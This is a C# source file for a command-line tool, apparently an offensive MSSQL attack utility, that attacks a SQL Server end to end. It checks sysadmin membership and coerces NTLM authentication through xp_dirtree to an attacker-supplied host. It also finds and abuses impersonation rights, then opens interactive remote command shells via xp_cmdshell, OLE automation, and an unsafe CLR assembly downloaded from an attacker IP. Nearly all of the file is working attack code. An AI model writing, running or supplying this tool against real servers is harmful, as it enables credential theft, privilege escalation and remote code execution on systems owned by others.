using System;
using System.Net;
using System.Data.SqlClient;


namespace MeowMSSQLchecker
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage : MeowMSSQLchecker.exe Module");
                Console.WriteLine("Module :");
                Console.WriteLine("    1  TARGET_HOST         Check Current User Groups.");
                Console.WriteLine("    2  TARGET_HOST  LHOST  UNC Path Injection.");
                Console.WriteLine("    3  TARGET_HOST         Find Impersonate User.");
                Console.WriteLine("    4  TARGET_HOST         Try to Impersonate \"dbo\".");
                Console.WriteLine("    5  TARGET_HOST  USER   Try to Impersonate User.");
                return;
            }

            int mode = Convert.ToInt32(args[0]);
            string LHOST = "";
            string USER = "";
            string sqlServer = args[1];

            if (mode == 2 & args.Length == 2)
            {
                Console.WriteLine("[!] Missing params : LHOST");
                return;
            }else if (mode == 2 & args.Length == 3) {
                LHOST = args[2];
            }

            if (mode == 5 & args.Length == 2)
            {
                Console.WriteLine("[!] Missing params : USER");
                return;
            }
            else if (mode == 5 & args.Length == 3)
            {
                USER = args[2];
            }

            string database = "master";
            string conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Successful Auth");
            }
            catch (Exception)
            {
                Console.WriteLine("[!] Failed to auth");
                Environment.Exit(1);
            }

            SQL_query("SELECT SYSTEM_USER;", 0, con);
            SQL_query("SELECT USER_NAME();", 4, con);

            switch (mode)
            {
                case 1:
                    Console.WriteLine("[+] Module : Checker");
                    Console.Write("[+] Member of public : ");
                    if (SQL_query("SELECT IS_SRVROLEMEMBER('public');", 1, con))
                    {
                        Console.WriteLine("Yes");
                    }
                    else
                    {
                        Console.WriteLine("No");
                    }

                    Console.Write("[+] Member of sysadmin : ");
                    if (SQL_query("SELECT IS_SRVROLEMEMBER('sysadmin');", 1, con))
                    {
                        Console.WriteLine("Yes");
                    }
                    else
                    {
                        Console.WriteLine("No");
                    }
                    break;
                case 2:
                    Console.WriteLine("[+] Module : UNC Path Injection");
                    try
                    {
                        SQL_query("EXEC master..xp_dirtree \"\\\\" + LHOST + "\\\\meow\";", 2, con);
                    }
                    catch
                    {
                        Console.WriteLine("[+] Done.");
                    }
                    break;
                case 3:
                    Console.WriteLine("[+] Module : Impersonate User");
                    SQL_query("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';", 3, con);
                    break;
                case 4:
                    Console.WriteLine("[+] Try to impersonate \"dbo\"");
                    SQL_query("use msdb; EXECUTE AS USER = 'dbo';", 6, con);
                    if (SQL_query("SELECT IS_SRVROLEMEMBER('sysadmin');", 1, con))
                    {
                        Console.WriteLine("[+] Successful impersonate to dbo");
                    }
                    else
                    {
                        Console.WriteLine("[!] Fail to impersonate to dbo");
                        return;
                    }
                    SQL_query("SELECT SYSTEM_USER;", 0, con);
                    Post_impersonate(con);
                    break;
                case 5:
                    Console.WriteLine("[+] Try to impersonate \"" + USER + "\"");
                    SQL_query("EXECUTE AS LOGIN = '" + USER + "';", 6, con);
                    SQL_query("SELECT SYSTEM_USER;", 0, con);
                    Post_impersonate(con);
                    break;
            }
            con.Close();
        }

        static void Post_impersonate(SqlConnection con)
        {
            int module;
            string CMD;
            while (true)
            {
                Console.WriteLine("[+] Modules :");
                Console.WriteLine("      1  Remote Code Execution - xp_cmdshell");
                Console.WriteLine("      2  Remote Code Execution - OLE");
                Console.WriteLine("      3  Remote Code Execution - Custom Assemblies");
                Console.Write("[?] Choose module :");
                module = Convert.ToInt32(Console.ReadLine());
                switch (module){
                    case 1:
                        Console.WriteLine("[+] Module : Remote Code Execution - xp_cmdshell");
                        Console.WriteLine("[+] Reconfigure xp_cmdshell");
                        SQL_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", 2, con);
                        while (true)
                        {
                            Console.WriteLine("[!] WARNING DON'T USE THIS CHAR : \"");
                            Console.Write("[?] Command : ");
                            CMD = Console.ReadLine();
                            if (CMD == "exit")
                            {
                                break;
                            }
                            SQL_query("EXEC xp_cmdshell \"" + CMD + "\"", 5, con);
                        }
                        break;
                    case 2:
                        Console.WriteLine("[+] Module : Remote Code Execution - OLE");
                        Console.WriteLine("[+] Enable OLE");
                        SQL_query("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", 2, con);
                        while (true)
                        {
                            Console.WriteLine("[!] WARNING DON'T USE THIS CHAR : '");
                            Console.Write("[?] Command : ");
                            CMD = Console.ReadLine();
                            if (CMD == "exit")
                            {
                                break;
                            }
                            SQL_query("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"" + CMD + "\"'", 2, con);
                        }
                        break;
                    case 3:
                        string ip;
                        string filename;
                        string payload;
                        Console.WriteLine("[+] Module : Remote Code Execution - Custom Assemblies");
                        Console.Write("[?] Attack IP : ");
                        ip = Console.ReadLine();
                        Console.Write("[?] Payload Filename : ");
                        filename = Console.ReadLine();
                        Console.WriteLine("[+] Disable CLR strict security");
                        SQL_query ("use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;", 2, con);
                        Console.WriteLine("[+] Get payload from attacker");
                        WebClient web = new WebClient();
                        try
                        {
                            payload = web.DownloadString("http://" + ip + "/" + filename);
                        }
                        catch
                        {
                            payload = "";
                            Console.WriteLine("[!] Cannot Connect to Attacker");
                            Environment.Exit(1);
                        }
                        Console.WriteLine("[+] Create assembly");
                        try
                        {
                            SQL_query("CREATE ASSEMBLY rce_assembly FROM 0x" + payload + " WITH PERMISSION_SET = UNSAFE;", 2, con);
                        }
                        catch
                        {
                            SQL_query("DROP PROCEDURE [dbo].[rce];", 2, con);
                            SQL_query("DROP ASSEMBLY rce_assembly;", 2, con);
                        }
                        
                        Console.WriteLine("[+] Create procedure");
                        SQL_query("CREATE PROCEDURE [dbo].[rce] @cmd NVARCHAR (4000) AS EXTERNAL NAME [rce_assembly].[StoredProcedures].[rce];", 2, con);
                        
                        while (true)
                        {
                            Console.WriteLine("[!] WARNING DON'T USE THIS CHAR : '");
                            Console.Write("[?] Command : ");
                            CMD = Console.ReadLine();
                            SQL_query("EXEC rce '" + CMD + "'", 5, con);
                            if (CMD == "exit")
                            {
                                break;
                            }
                        }
                        Console.WriteLine("[+] Clearn up");
                        SQL_query("DROP ASSEMBLY rce_assembly;", 2, con);
                        SQL_query("DROP PROCEDURE [dbo].[rce];", 2, con);
                        break;
                }
            }
        }

        static bool SQL_query(string cmd, int mode, SqlConnection con)
        {
            bool result;
            SqlCommand command = new SqlCommand(cmd, con);
            SqlDataReader reader = command.ExecuteReader();
            switch (mode)
            {
                case 0:
                    reader.Read();
                    Console.WriteLine("[+] Logged in as : " + reader[0]);
                    result = true;
                    reader.Close();
                    break;
                case 1:
                    reader.Read();
                    Int32 role = Int32.Parse(reader[0].ToString());
                    result = (role == 1);
                    reader.Close();
                    break;
                case 2:
                    result = true;
                    break;
                case 3:
                    while(reader.Read())
                    {
                        Console.WriteLine("[+] User can be Impersonate : " + reader[0]);
                    }
                    result = true;
                    reader.Close();
                    break;
                case 4:
                    reader.Read();
                    Console.WriteLine("[+] Database Privilege : " + reader[0]);
                    result = true;
                    reader.Close();
                    break;
                case 5:
                    Console.WriteLine("[+] Command Result :");
                    while (reader.Read())
                    {
                        Console.WriteLine(reader[0]);
                    }
                    result = true;
                    reader.Close();
                    break;
                case 6:
                    result = true; 
                    break;
                default: 
                    result = true;
                    reader.Close(); 
                    break;
            }
            reader.Close();
            return result;
        }

    }

}
